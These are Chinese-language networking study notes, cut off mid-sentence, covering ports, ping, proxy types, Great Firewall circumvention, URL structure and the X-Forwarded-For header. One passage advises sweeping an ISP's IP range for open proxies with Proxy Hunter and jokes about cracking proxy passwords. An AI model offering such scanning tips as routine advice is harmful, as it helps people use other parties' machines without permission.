id="server监听是啥意思端口解释">server监听是啥意思？+’端口‘解释</h2><ul><li>首先了解一下TCP/IP协议中的端口指的是什么呢？如果把IP地址比作一间房子，端口就是出入这间房子的门。真正的房子只有几个门，但是一个IP地址的端口可以有65536（即：256×256）个之多！端口是通过端口号来标记的，端口号只有整数，范围是从0到65535（256×256-1）。在Internet上，各主机间通过TCP/IP协议发送和接收数据包，各个数据包根据其目的主机的ip地址来进行互联网络中的路由选择。可见，把数据包顺利的传送到目的主机是没有问题的。问题出在哪里呢?我们知道大多数操作系统都支持多程序（进程）同时运行，那么<strong>目的主机应该把接收到的数据包传送给众多同时运行的进程中的哪一个呢</strong>？<strong>显然这个问题有待解决，端口机制便由此被引入进来</strong>。本地操作系统会给那些有需求的进程分配协议端口（protocolport，即我们常说的端口），每个协议端口由一个正整数标识，如：80，139，445，等等。当目的主机接收到数据包后，将根据报文首部的目的端口号，把数据发送到相应端口，而与此端口相对应的那个进程将会领取数据并等待下一组数据的到来。说到这里，端口的概念似乎仍然抽象，那么继续跟我来，别走开。端口其实就是队，操作系统为各个进程分配了不同的队，数据包按照目的端口被推入相应的队中，等待被进程取用，在极特殊的情况下，这个队也是有可能溢出的，不过操作系统允许各进程指定和调整自己的队的大小。不光接受数据包的进程需要开启它自己的端口，发送数据包的进程也需要开启端口，这样，数据包中将会标识有源端口，以便接受方能顺利的回传数据包到这个端口。</li></ul><pre><code class="hljs armasm">一个数据包包括了文件，<span class="hljs-built_in">ip</span>，和端口号，<span class="hljs-built_in">ip</span>是为了服务器可以找到你的主机，端口号是你接受数据包的门户， 而所谓的端口监听，是指主机网络进程接受到<span class="hljs-built_in">IP</span>数据包后，察看其的目标端口是不是自己的端口号，如果是的话就接受该数据包进行处理。进行网络通讯的主机，既要发送数据，也要接受数据，所以就要开启相应的端口以接受数据。一个网络上的主机有可能开启多个网络进程（如即浏览网页又上QQ），也就是监听了多个端口。</code></pre><h2 id="ping">ping</h2><p><a href="https://www.jianshu.com/p/d45540c86d2c">ping是什么</a></p><p>https://blog.csdn.net/hebbely/article/details/54965989</p><ul><li>简单来说，「ping」是用来探测本机与网络中另一主机之间是否可达的命令，如果两台主机之间ping不通，则表明这两台主机不能建立起连接。ping是定位<strong>网络通不通</strong>的一个重要手段。</li><li><strong>ping可以检查网络是否连通，可以很好地帮助我们分析和判定网络故障</strong></li><li><strong>它所利用的原理是这样的：利用网络上机器IP地址的唯一性，给目标IP地址发送一个数据包，再要求对方返回一个同样大小的数据包来确定两台网络机器是否连接相通，时延是多少。</strong></li><li><strong>总结来说ping就是从某个数据包发送到服务器开始，到收到服务器反馈为止的时间就是ping，一般以毫秒计算。游戏中常常会用到ping的速度问题，比如：lol中ctrl+f就会出现ping值，一般ping值越高，说明服务器反馈时间长，游戏就会越卡。</strong></li><li><strong>ping是TCP/IP通信协议的一部分</strong></li></ul><pre><code class="hljs routeros">使用Ping检查连通性有五个步骤：*1. 使用ipconfig /all观察本地网络设置是否正确；2.<span class="hljs-built_in"> Ping </span>127.0.0.1  检查本地的TCP/IP协议有没有设置好；!!3. Ping本机IP地址，这样是为了检查本机的IP地址是否设置有误；!!4. Ping本网网关或本网IP地址，这样的是为了检查硬件设备是否有问题，也可以检查本机与本地网络连接是否正常；（在非局域网中这一步骤可以忽略）5. Ping远程IP地址，这主要是检查本网或本机与外部的连接是否正常。</code></pre><pre><code class="hljs angelscript">Pinging <span class="hljs-number">202.105</span><span class="hljs-number">.136</span><span class="hljs-number">.105</span> with <span class="hljs-number">32</span> bytes of data:Reply <span class="hljs-keyword">from</span> <span class="hljs-number">202.105</span><span class="hljs-number">.136</span><span class="hljs-number">.105</span>: bytes=<span class="hljs-number">32</span> time=<span class="hljs-number">590</span>ms TTL=<span class="hljs-number">114</span>Reply <span class="hljs-keyword">from</span> <span class="hljs-number">202.105</span><span class="hljs-number">.136</span><span class="hljs-number">.105</span>: bytes=<span class="hljs-number">32</span> time=<span class="hljs-number">590</span>ms TTL=<span class="hljs-number">114</span>Reply <span class="hljs-keyword">from</span> <span class="hljs-number">202.105</span><span class="hljs-number">.136</span><span class="hljs-number">.105</span>: bytes=<span class="hljs-number">32</span> time=<span class="hljs-number">590</span>ms TTL=<span class="hljs-number">114</span>Reply <span class="hljs-keyword">from</span> <span class="hljs-number">202.105</span><span class="hljs-number">.136</span><span class="hljs-number">.105</span>: bytes=<span class="hljs-number">32</span> time=<span class="hljs-number">601</span>ms TTL=<span class="hljs-number">114</span>Ping statistics <span class="hljs-keyword">for</span> <span class="hljs-number">202.105</span><span class="hljs-number">.136</span><span class="hljs-number">.105</span>:Packets: Sent = <span class="hljs-number">4</span>, Received = <span class="hljs-number">4</span>, Lost = <span class="hljs-number">0</span> (<span class="hljs-number">0</span>% loss),Approximate round trip times <span class="hljs-keyword">in</span> milli-seconds:Minimum = <span class="hljs-number">590</span>ms, Maximum = <span class="hljs-number">601</span>ms, Average = <span class="hljs-number">593</span>ms</code></pre><ul><li><p>Ping这个命令除了可以检查网络的连通和检测故障以外，还有一个比较有趣的用途，那就是可以利用它的一些返回数据，来估算你跟某台主机之间的速度是多少字节每秒</p></li><li><p>bytes=32表示ICMP报文中有32个字节的测试数据（这是估算速度的关键数据）</p></li><li><p>"时间=6ms"是往返时间。</p><p>"已发送=4"发送多个秒包、"已接收=4"收到多个回应包、"丢失=0"丢弃了多少个；</p><p>Minmum 最小值 、MAXimun 最大值、Average 平均值。</p><p>所在图上来看，来回只用了6MS 时间，lost =0即是丢包数为0，网络状态相当良好；</p></li></ul><pre><code class="hljs stylus">ping -t www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>  <span class="hljs-comment">// Ping 指定的主机，直到停止。</span>例如命令：ping -t www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span> 那么机器会一直ping www<span class="hljs-selector-class">.baidu</span>.com直到我们按Ctrl+C键来停止。</code></pre><pre><code class="hljs stylus">ping -n www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span> <span class="hljs-comment">//定义向目标IP发送数据包的次数</span>例如命令：ping -n <span class="hljs-number">10</span> www<span class="hljs-selector-class">.baidu</span>.com，那么本地计算机就会ping www<span class="hljs-selector-class">.baidu</span>.com10次，如果不加-n 参数的话，系统默认是ping4次</code></pre><pre><code class="hljs markdown">ping -l www.baidu.com    //定义发送数据包的大小，默认为32字节，我们利用它可以最大定义到65500字节。例如命令：ping -l 100 [<span class="hljs-string">www.baidu.com</span>](<span class="hljs-link">https://link.jianshu.com?t=http://www.baidu.com</span>)，那么本地计算机就会用100字节的数据包去 ping [<span class="hljs-string">www.baidu.com</span>](<span class="hljs-link">https://link.jianshu.com?t=http://www.baidu.com</span>)，系统默认的数据包是32字节，最大的字节数是65，527。</code></pre><pre><code class="hljs angelscript">Ping <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>   <span class="hljs-comment">//127.0.0.1是本地循环地址</span></code></pre><ul><li>如果本地址无法Ping通，则表明本地机TCP/IP协议不能正常工作。</li></ul><h3 id="对ping后返回信息的分析">对Ping后返回信息的分析</h3><blockquote><h6 id="request-timed-out">Request timed out</h6></blockquote><p>这是大家经常碰到的提示信息，很多文章中说这是对方机器置了过滤ICMP数据包，从上面工作过程来看，这是不完全正确的，至少有下几种情况。　　　(1) 对方已关机，或者网络上根本没有这个地址：比如在上图中主机A中PING192.168.0.7 ,或者主机B关机了，在主机A中PING 192.168.0.5都会得到超时的信息。 　(2)对方与自己不在同一网段内，通过路由也无法找到对方，但有时对方确实是存在的，当然不存在也是返回超时的信息。　(3) 对方确实存在，但设置了ICMP数据包过滤(比如防火墙设置)。　怎样知道对方是存在，还是不存在呢，可以用带参数 -a的Ping命令探测对方，如果能得到对方的NETBIOS名称，则说明对方是存在的，是有防火墙设置，如果得不到，多半是对方不存在或关机，或不在同一网段内</p><blockquote><ul><li>其他的见链接</li></ul></blockquote><h2 id="代理服务器">代理服务器</h2><p><strong>需求描述</strong>：</p><p>　　最近几天接触了<strong>代理服务器</strong>这个词，突然想，代理到底是什么呢？</p><p>　　什么代理服务器呢，使用这个代理服务器的目的到底是啥呢？</p><p><strong>概念分析</strong>：</p><h3 id="代理proxy"><strong>1.代理proxy：</strong></h3><p>　　首先从概念上讲，代理这个词，词语的汉语解释：<strong>受委托代表当事人进行某种活动。</strong></p><p>　　也就是说，代理的作用就是代替别人做一些事情，比如，代理律师，就是代表当事人进行法律的活动。</p><h3 id="代理服务器proxy-server"><strong>2.代理服务器proxyserver</strong></h3><p>　　我们将上面的概念进行类比，代理服务器也就是一台服务器，一般我们的请求，会直接发送给真实的服务器，</p><p>　　真实的服务器来响应我们的请求。那么代理服务器的作用，就是把我们的请求先发送给代理服务器，由代理</p><p>　　服务器来将请求发送给真实的目标服务器上。同时呢，代理服务器可以判断，是否要真的把我们的一些请求发送</p><p>　　给真实的服务器，比如，在公司，不能上外网，那么公司会提供一个代理服务器，通过这个代理服务器我们就能上</p><p>　　外网了，但是会发现，有些视频网站，特殊的网站是访问不了的，也就是我们的这些请求不满足代理服务器的请求要求。</p><p>　　简单来说：代理服务器，就是代替我们把请求发送到目标服务器。</p><h3 id="使用代理服务器的目的"><strong>3.使用代理服务器的目的</strong></h3><p>　　--1）提高性能</p><p>　　代理服务器会有缓存，如果多次请求，或者多个请求是同样的内容，可以跳过从真实服务器取数据的过程，而是直接从代理服务器上获取</p><p>　　对于有成千上万的请求来说，那么会减少时间的消耗，进而提高性能</p><p>　　--2）过滤请求</p><p>　　比如，公司的代理服务器会过滤一些请求，来阻止员工访问一些特定的网站。</p><p>https://sites.google.com/site/2018pk/222</p><h2 id="浅谈代理"><strong><em>浅谈代理</em></strong></h2><p>首先要说明，我们这里要谈的代理，是代理服务器，英文名叫ProxyServer。一般来讲，对于我们这些普通的网民它的作用有三个（撇开一些高深的用处不谈，因为我们未必会用到）</p><p>一是通过它，我们可以访问到一些平时不能去的网站。不信你可以马上打开你的浏览器和输入“www.youtube.com”这个网址。怎样？不用看着浏览器在这里空等了，并不是你的网络速度慢，也不是没有这个网站，而是你访问不到它（网络上还有很多这些类型的网站哦）。为什么访问不到？这个问题嘛......说法有很多种，大部分都说是国内的网络被限制了访问，所以某些网站是不能去的。至于如何可以访问到这些网站？看完本文你就知道了！</p><p>二是通过它来加快我们浏览某些网站的速度。有时候我们访问一些国外或者港台网站，速度慢得像蜗牛一样。但只要你正确的选用代理服务器，速度就可以得到提升，有时候这些速度的提升可是很明显的哦！</p><p>三是连接Internet与Intranet充当firewall（防火墙）：因为所有内部网的用户通过代理服务器访问外界时，只映射为一个IP地址，所以外界不能直接访问到内部网；同时可以设置IP地址过滤，限制内部网对外部的访问权限；另外，两个没有互联的内部网，也可以通过第三方的代理服务器进行互联来交换信息。如果你在以往浏览过程中出现过以上的情况，那么看来你有必要尝试一下使用代理服务器了。为什么使用代理服务器可以使我们访问一些原本不能访问的网站呢？为什么使用它后浏览外国网站会比原来的快呢？形象的说：代理服务器是网络信息的中转站。在一般情况下，我们使用网络浏览器直接去连接其他Internet站点取得网络信息时，须送出Request信号来得到回答，然后对方再把信息以bit方式传送回来。</p><p>代理服务器是介于浏览器和Web服务器之间的一台服务器，有了它之后，浏览器不是直接到Web服务器去取回网页而是向代理服务器发出请求，Request信号会先送到代理服务器，由代理服务器来取回浏览器所需要的信息并传送给你的浏览器。而且，大部分代理服务器都具有缓冲的功能，就好象一个大的Cache，它有很大的存储空间，它不断将新取得数据储存到它本机的存储器上，如果浏览器所请求的数据在它本机的存储器上已经存在而且是最新的，那么它就不重新从Web服务器取数据，而直接将存储器上的数据传送给用户的浏览器，这样就能显著提高浏览速度和效率（速度会随着代理服务器地理位置的不同以及网络传输情况而改变），而且国外的网络大部分都是没有限制访问网站或者所限制的不同，所以我们有很大的机会通过代理服务器去访问那些原本不能够去的网站。</p><p>更重要的是：Proxy Server (代理服务器)是Internet链路级网关所提供的一种重要的安全功能，它的工作主要在开放系统互联(OSI) 模型的对话层。proxy对于我们这么有用，那么究竟怎样才可以在诺大的网络上找寻这些服务器呢？这就要靠一些专门找寻proxy的软件了，下面就是几款常用软件的介绍：1.Proxy Hunter这是Proxy搜索软件的老大哥了,自从1.0推出以来,就倍受全国网友热爱,目前版本是3.0,这个ProxyHunter有什么特点呢?搜索速度之快,是同类软件之首,同时带有预测搜索任务完成时间的功能,除了教育网外,不限制搜索IP地址范围,同时支持HTTP与SOCKS类Proxy的搜索和验证,具备对已搜索得的Proxy地址进行管理,使用,自动调度,再验证等先进的功能。当有一大堆Proxy,不知用哪个好时,这时你需要自动调度功能,将网络软件的Proxy设置为本机IP(127.0.0.1),端口8080,然后在ProxyHunter搜索结果列表中将欲使用的Proxy按鼠标右键设为“使用”(Enable),这样ProxyHunter就会根据当时各Proxy速度的快慢,选择一个或数个使用,很方便吧。</p><p>2.Proxy NOW系列 这是由网站自动更新软件Update NOW的作者开发的,由HTTPProxy NOW、SOCKS Proxy NOW、FTP ProxyNOW三部分组成，顾名思义,功能是分别搜索上述三类Proxy用的,若是能将其合一在一个软件里就好了,ProxyNOW系列的优点是绝对不限制搜索IP范围,但没注册进入时会有延时,不过只有几秒钟,没大碍,搜索速度还可以,算是中规中矩,缺点是功能分散单一,可设置项较少,验证不那么完善。</p><p>3.SOCKS Cat 这是专门搜索SOCKSProxy的,同样不限制搜索IP地址范围,速度也比较快,据作者称,其速度只比ProxyHunter慢些,不过在验证SOCKSProxy方面要做得好,同时支持SOCKS4、SOCKS5的Proxy的搜索和验证,支持设置供验证的网页,设置最高连接数等,经实际使用,效果不错,如果能加入对HTTPProxy的搜索和验证功能可能会更好。</p><p>总结:三者以ProxyHunter为较好,但也不能一棵树吊死,应具体情况具体分析,选择一个适合的来用。</p><p>当然,有些搜索经验也应该掌握,搜索Proxy,如大海捞针,不掌握要领,可是要吃大亏的。大规模搜索,效果好,但成本高,耗时长,不值得推荐。经过实践,局部地区震荡IP搜索法较好。例如,你所在地有一大ISP或者是ICP,假设其IP地址为202.96.123.123,这时请以总数1275(255×5)为震荡范围,计算出应尝试搜索的范围是202.96.121.0至202.96.125.255,祝你好运!还有连接时间设长一点,以及注意加入以下端口8080(HTTP)3128(HTTP) 80(HTTP) 1080(SOCKS)这样才不会有漏网之鱼。</p><p>接下来将以ProxyHunter为例子，为大家讲解如何搜索proxy。当你填加完任务后，返回到主界面，按蓝色的开始键，这样ProxyHunter就会开始搜索代理了。现在你需要做的事情就是盯住搜索结果栏和耐心地等待。</p><p>服务器地址：这里出现的就是你搜索到的代理服务器的IP。端口：这个是它所用的端口。</p><p>类型：就是这个Proxy的类型。验证状态：这个最重要，它的状态分几种，上图列出的就是其中几种状态，通常如果成功搜索到这个proxy的话，它会显示为“FREE”，那么你就可以直接使用这个proxy；如果显示为“要密码”的话，基本上你可以把这个proxy删除了，除非你有能力把它的密码破解吧...；要是显示“连接超时”或“连接失败”等其他状态的话，那么可能你现在的网络正处于繁忙状态，也有可能是这个proxy暂时关闭了，你可以隔一段时间再去验证一次。</p><p>时间特性：这个数值影响到这个proxy的速度，它显示的是你的机器连接到proxy的时间，如果你有多个proxy供你选择话，那么就选一个相对数值小的一个吧，连接的时间越小就代表这个porxy越快。</p><p>经过上一步的搜索，想必你已经搜索到几个“Free”属性的Proxy了吧？恭喜恭喜～那么究竟怎样才可以用这些Proxy呢？其实很简单，大部分软件都有一些软件属性的选项，比如“Setting”和“Preferences”等等。而在这些选项里面通常会有“Proxy”这个选项，你只需要在“Proxy”选项里面填上你搜索出来的Proxy的IP的端口，那么就可以使用这个Proxy了。如果软件是中文的话那么就更加简单，只要在“设置代理服务器”里面填上就ok了。</p><p>以浏览器IE6为例： １、打开“工具”里面的“Internet选项”。２、点选“连接”框。３、如果你使用拨号上网的话，那么选择“设置”。如果你是使用局域网的话，那么选择“局域网设置”。４、在里面就有“代理服务器”这个设置。先点击“使用代理服务器”，然后在“地址”上填上Proxy的IP，在“端口”填上端口，好了！大功告成。</p><p>1.HTTP代理服务器 代理服务器英文全称是ProxyServer，其功能就是代理网络用户去取得网络信息。形象的说：它是网络信息的中转站。在一般情况下，我们使用网络浏览器直接去连接其他Internet站点取得网络信息时，须送出Request信号来得到回答，然后对方再把信息以bit方式传送回来。代理服务器是介于浏览器和Web服务器之间的一台服务器，有了它之后，浏览器不是直接到Web服务器去取回网页而是向代理服务器发出请求，Request信号会先送到代理服务器，由代理服务器来取回浏览器所需要的信息并传送给你的浏览器。而且，大部分代理服务器都具有缓冲的功能，就好象一个大的Cache，它有很大的存储空间，它不断将新取得数据储存到它本机的存储器上，如果浏览器所请求的数据在它本机的存储器上已经存在而且是最新的，那么它就不重新从Web服务器取数据，而直接将存储器上的数据传送给用户的浏览器，这样就能显著提高浏览速度和效率。更重要的是：ProxyServer(代理服务器)是Internet链路级网关所提供的一种重要的安全功能，它的工作主要在开放系统互联(OSI)模型的对话层。主要的功能有：1.突破自身IP访问限制，访问国外站点。如：教育网、169网等网络用户可以通过代理访问国外网站。2.访问一些单位或团体内部资源，如某大学FTP(前提是该代理地址在该资源的允许访问范围之内)，使用教育网内地址段免费代理服务器，就可以用于对教育网开放的各类FTP下载上传，以及各类资料查询共享等服务。3.突破中国电信的IP限制：中国电信用户有很多网站是被限制访问的，这种限制是人为的，不同Serve对地址的限制是不同的。所以不能访问时可以换一个国外的代理服务器试试。4.提高访问速度：通常代理服务器都设置一个较大的硬盘缓冲区，当有外界的信息通过时，同时也将其保存到缓冲区中，当其他用户再访问相同的信息时，则直接由缓冲区中取出信息，传给用户，以提高访问速度。5.隐藏真实IP：上网者也可以通过这种方法隐藏自己的IP，免受攻击。 2.SSL代理SSL是一种国际标准的加密及身份认证通信协议，您用的浏览器就支持此协议。SSL（SecureSocketsLayer）最初是由美国Netscape公司研究出来的，后来成为了Internet网上安全通讯与交易的标准。SSL协议使用通讯双方的客户证书以及CA根证书，允许客户/服务器应用以一种不能被偷听的方式通讯，在通讯双方间建立起了一条安全的、可信任的通讯通道。它具备以下基本特征：信息保密性、信息完整性、相互鉴定。主要用于提高应用程序之间数据的安全系数。SSL协议的整个概念可以被总结为：一个保证任何安装了安全套接字的客户和服务器间事务安全的协议，它涉及所有TC/IP应用程序。SSL代理:支持最高128位加密强度的http代理，可以作为访问加密网站的代理。加密网站是指以https://开始的网站。ssl的标准端口为443。默认状态下，IIS使用端口443作为SSL端口。但是你也可以根据需要使用任意端口。你可以有很多站点，每个站点有一个非SSL端口数字和一个SSL端口数字。例如，你可以有一个称为ExampleSite的站点，可以把90作为非SSL端口，445作为SSL端口。用户输入http://www.ExampleSite.com;来访问非SSL版本。要访问其SSL版本，就要输入https://www.ExampleSite.com。他们也可以使用IP：端口数,比如https://www..com:445。 https://中的“s”非常重要，因为它告诉用户浏览器使用SSL端口。如果你使用了http://www.Example.com:445，那么什么也不会发生，浏览器只是等待，但是什么也不显示出来。如果你给一个非SSL端口使用https，例如https://www.ExampleSite.com:90，会出现同样的情形。 3.Socks 代理是全能代理，就像有很多跳线的转接板，它只是简单地将一端的系统连接到另外一端。支持多种协议，包括http、ftp请求及其它类型的请求。它分socks4 和socks 5两种类型，socks 4只支持TCP协议而socks5支持TCP/UDP协议，还支持各种身份验证机制等协议。其标准端口为1080。socks代理相应的采用socks协议的代理服务器就是SOCKS服务器，是一种通用的代理服务器。Socks是个电路级的底层网关，是DavidKoblas在1990年开发的，此后就一直作为InternetRFC标准的开放标准。Socks不要求应用程序遵循特定的操作系统平台，Socks代理与应用层代理、 HTTP层代理不同，Socks代理只是简单地传递数据包，而不必关心是何种应用协议（比如FTP、HTTP和NNTP请求）。所以，Socks代理比其他应用层代理要快得多。它通常绑定在代理服务器的1080端口上。如果您在企业网或校园网上，需要透过防火墙或通过代理服务器访问Internet就可能需要使用SOCKS。一般情况下，对于拨号上网用户都不需要使用它。注意，浏览网页时常用的代理服务器通常是专门的http代理，它和SOCKS是不同的。因此，您能浏览网页不等于您一定可以通过SOCKS访问Internet。常用的防火墙，或代理软件都支持SOCKS，但需要其管理员打开这一功能。如果您不确信您是否需要SOCKS或是否有SOCKS可用，请与您的网络管理员联系。为了使用socks，您需要了解一下内容： ① SOCKS服务器的IP地址 ②SOCKS服务所在的端口 ③这个SOCKS服务是否需要用户认证？如果需要，您要向您的网络管理员申请一个用户和口令知道了上述信息，您就可以把这些信息填入“网络配置”中，或者在第一次登记时填入，您就可以使用socks代理了。在实际应用中SOCKS代理可以用作为：电子邮件、新闻组软件、网络传呼ICQ、网络聊天MIRC和使用代理服务器上联众打游戏等等各种游戏应用软件当中。4.高级匿名代理 不改变你的requestfields（报文），使服务器端看来就像有个真正的客户浏览器在访问它。当然，你的真实IP是隐藏起来的。服务器的网管不会认为你使用了代理。5.普通匿名代理 能隐藏你的真实IP，但会更改你的requestfields，有可能会被认为使用了代理，但仅仅是可能，一般说来是没问题的。不过不要受它的名字的误导，其安全性可能比全匿名代理更高，有的代理会剥离你的部分信息（就好比防火墙的stealthmode），使服务器端探测不到你的操作系统版本和浏览器版本。 6.elite代理匿名隐藏性更高，可隐藏系统及浏览器资料信息等。此种代理安全性特强。7.透明代理（简单代理）：透明代理的意思是客户端根本不需要知道有代理服务器的存在，它改编你的requestfields（报文），并会传送真实IP。注意，加密的透明代理则是属于匿名代理，意思是不用设置使用代理了，例如Garden2程序。 8.其它代理FTP代理：代理客户机上的ftp软件访问ftp服务器，其端口一般为21、2121。POP3代理：代理客户机上的邮件软件用pop3方式收邮件，其端口一般为110。Telnet代理：能够代理通信机的telnet，用于远程控制，入侵时经常使用。其端口一般为23。TUNNEL代理：经HTTPTunnet程序转换的数据包封装成http请求（Request）来穿透防火墙，允许利用HTTP服务器做任何TCP可以做的事情，功能相当于Socks5。文献代理：可以用来查询数据库的代理，通过这些代理，可以获得互联网的相关科研学术的数据库资源，例如查询Sciencedirect网站（简称SD）、AcademicPress、IEEE，SPRINGER等数据库。教育网代理：指学术教育机构局域网通过特定的代理服务器可使无出国权限或无访问某IP段权限的计算机访问相关资源。跳板代理：应用于跳板程序，可以看作一种具有动态加密的特殊socks5代理，，也可直接用于PSD软件。其端口一般为1813。Ssso代理：代理客户机上的ssso程序访问远程网站，具有SSL加密强度的超级代理，支持socks。Flat代理：代理客户机上的flatsurfer程序访问远程网站，具有高强度加密数据流的特殊代理，支持socks，最大可设置三次级联，可以设置穿越代理。其端口一般为6700。SoftE代理：代理客户机上的SoftEther程序访问远程网站，应用虚拟集线器HUB和虚拟网卡技术，具备VPN功能及多种认证方式的代理。</p><p>网友们在中国上网最头疼的是什么？网速慢？网络不稳定？NO<sub>NO</sub>NO<sub>NO</sub>,在中国上网最头疼的是，永远有一面墙阻碍着你，让你上不了诸如：twitter、Facebook、youtube这些优秀的网站，正因为有了这一面“墙”，我们中国网民才个个都成了翻墙高手。这是不完全翻墙的结果，就是网站能上，视频看不了！</p><p>要想翻墙，就要先了解一下，这面“墙”的工作原理原理：防火长城对所有经过骨干出口路由的在UDP的53端口上的域名查询进行IDS入侵检测，一经发现与黑名单关键词相匹配的域名查询请求，防火长城会马上伪装成目标域名的解析服务器给查询者返回虚假结果。由于通常的域名查询没有任何认证机制，而且域名查询通常基于的UDP协议是无连接不可靠的协议，查询者只能接受最先到达的格式正确结果，并丢弃之后的结果。而用户直接查询境外域名查询服务器（比如Google Public DNS）又可能会被防火长城污染，从而在没有任何防范机制的情况下仍然不能获得目标网站正确的IP地址。VIA维基百科从上面我们了解了GFW（防火长城，又称中国防火墙）的工作原理，下面我们就可以实施翻墙工作。</p><p>翻墙的方式有很多，下面一一介绍 1、最简单的翻墙方式——网页代理</p><p>提供网页代理的网站有很多，如</p><p>（1）http://proxyie.cn/ （2）http://www.nbdaili.com/（3）https://member.proxy80.cn/ （4）http://proxy.fengyn.com/</p><p>网页代理的优点就是方便，随手可得，可是也有很多的缺点，如：不稳定、对部分网页支持不好、有时只能加载主页面（也就是前面所说的不完全翻墙）、而且，网页翻墙遇到关键词屏蔽就没辙了，因为网页代理是透明代理。</p><p>2、HTTP代理 HTTP代理就是通过修改浏览器中代理一项来达到翻墙的目的。但是,HTTP代理目前已经很少人去用，因为操作麻烦，代理服务器要自己去找（现在要找到稳定的、速度快的代理服务器也比较难了），而且，HTTP代理也分好几级，有透明代理和加密代理，但现在一般都只能找到透明代理。</p><p>3、HTTP代理以后衍生出的一种代理方式——自动代理自动代理的原理和HTTP代理的原理差不多，只不过自动代理将搜索代理、设置代理都变的自动化，目前自动代理的软件也很多，有自由门、HotspotShield Launch等，我用的就是Hotspot ShieldLaunch，是免费的，只是它会在网页顶放置广告。 虽说Hotspot ShieldLaunch是自动代理的一种，但也属于VPN。</p><p>4、VPNVPN的原理就是在你和服务器中间建立一条加密通道，因为此通道是加密的，所以GFW也奈何不了你，是最好的代理方式。要说缺点，就是目前免费的VPN比较少，都要付费，可也并不贵，上面的HotspotShieldLaunch就是其中一款免费VPN。（VPN也有两种方式，一种是上面的软件，一中是VPN服务商给一个VPN账号和密码，想宽带拨号那样，建立一个连接。）</p><p>前面所说的代理方式一般都要经过外国的服务器，所以网速自然不能保证，那既然GFW只是不让返回一个真实IP地址，那我们就让电脑先知道该网站的IP地址。</p><p>最后介绍的方法就是修改hosts文件hosts文件其实就是一个文本文件，用记事本就可以打开，电脑访问网站，其实是通过以下流程完成的：电脑——检测host说是否有该网站IP（如没有）——ISP——DNS服务器——IP地址——网站服务器，只要电脑检测到host说已经存在该域名的IP地址，就会绕过DNS解析，直接连接对方服务器，因为GFW就是在域名解析这里做手脚，只要绕过就行了。hosts文件路径是：C:，目前可以上google搜到这些IP地址。</p><p>改hosts方式翻墙只要按照下面的格式添加就行：IP地址 域名这种方式的优点就是绕过大部分步骤，不用经过国外的转发服务器，访问速度快。但缺点也很明显，由于GFW也检测IP地址，如果多人用这种方式翻墙，GFW很快就会发现并屏蔽，所以生命周期短。而且，因为对方服务器的IP是有限的，当所有IP都被GFW屏蔽以后，这个方法就失效了。所以目前最好的方式还是用VPN，也并不是太贵。</p><h2 id="html">HTML</h2><p>https://www.zhihu.com/question/20377296</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies">HTTP所有的百科</a></p><h2 id="mime-type">MIME TYPE</h2><p>https://www.jianshu.com/p/24c5433ce31b</p><h2 id="httpurl">HTTP、URL</h2><p>https://www.jianshu.com/p/80e25cb1d81a</p><p>Http协议定义了很多与服务器交互的方法，最基本的有4种，分别是GET,POST,PUT,DELETE.一个URL地址用于描述一个网络上的资源，而HTTP中的GET, POST, PUT,DELETE就对应着对这个资源的查，改，增，删4个操作。我们最常见的就是GET和POST了。GET一般用于获取/查询资源信息，而POST一般用于更新资源信息.</p><p>HTTP使用统一资源标识符（Uniform Resource Identifiers,URI）来传输数据和建立连接。URL是一种特殊类型的URI，包含了用于查找某个资源的足够的信息</p><h3 id="url"><strong>URL</strong></h3><p>全称是UniformResourceLocator,中文叫统一资源定位符,是互联网上用来标识某一处资源的地址。以下面这个URL为例，介绍下普通URL的各部分组成：</p><p><a href="https://link.jianshu.com?t=http://www.aspxfans.com:8080/news/index.asp?boardID=5&amp;ID=24618&amp;page=1#name">http://www.aspxfans.com:8080/news/index.asp?boardID=5&amp;ID=24618&amp;page=1#name</a></p><p>从上面的URL可以看出，一个完整的URL包括以下几部分：1.协议部分：该URL的协议部分为“http：”，这代表网页使用的是HTTP协议。在Internet中可以使用多种协议，如HTTP，FTP等等本例中使用的是HTTP协议。在"HTTP"后面的“//”为分隔符</p><p>2.域名部分：该URL的域名部分为“<a href="https://link.jianshu.com?t=http://www.aspxfans.com">www.aspxfans.com</a>”。一个URL中，也可以使用IP地址作为域名使用</p><p>3.端口部分：跟在域名后面的是端口，域名和端口之间使用“:”作为分隔符。端口不是一个URL必须的部分，如果省略端口部分，将采用默认端口</p><p>4.虚拟目录部分：从域名后的第一个“/”开始到最后一个“/”为止，是虚拟目录部分。虚拟目录也不是一个URL必须的部分。本例中的虚拟目录是“/news/”</p><p>5.文件名部分：从域名后的最后一个“/”开始到“？”为止，是文件名部分，如果没有“?”,则是从域名后的最后一个“/”开始到“#”为止，是文件部分，如果没有“？”和“#”，那么从域名后的最后一个“/”开始到结束，都是文件名部分。本例中的文件名是“index.asp”。文件名部分也不是一个URL必须的部分，如果省略该部分，则使用默认的文件名</p><p>6.锚部分：从“#”开始到最后，都是锚部分。本例中的锚部分是“name”。锚部分也不是一个URL必须的部分</p><p>7.参数部分：从“？”开始到“#”为止之间的部分为参数部分，又称<strong>搜索部分、查询部分</strong>。本例中的参数部分为“boardID=5&amp;ID=24618&amp;page=1”。参数可以允许有多个参数，参数与参数之间用“&amp;”作为分隔符。</p><h3 id="section-2"></h3><h3 id="x-forwarded-for-xff"><strong>X-Forwarded-For</strong><strong>(XFF)</strong></h3><ul><li><strong>用来获取最初发起请求的客户端的IP地址</strong></li></ul><pre><code class="hljs xml">X-Forwarded-For: <span class="hljs-tag">&lt;<span class="hljs-name">client</span>&gt;</span>, <span class="hljs-tag">&lt;<span class="hljs-name">proxy1</span>&gt;</span>, <span class="hljs-tag">&lt;<span class="hljs-name">proxy2</span>&gt;</span></code></pre><ul><li><p><client></client></p><p>客户端的IP地址。</p></li><li><p><proxy1>, <proxy2></proxy2></proxy1></p><p>如果一个请求经过了多个代理服务器，那么每一个代理服务器的IP地址都会被依次记录在内。也就是说，最右端的IP地址表示最近通过的代理服务器，而最左端的IP地址表示最初发起请求的客户端的IP地址。</p></li></ul><p>eg：</p><pre><code class="hljs html">X-Forwarded-For: 2001:db8:85a3:8d3:1319:8a2e:370:7348X-Forwarded-For: 203.0.113.195X-Forwarded-For: 203.0.113.195, 70.41.3.18, 150.172.238.178</code></pre><p>因为 IP 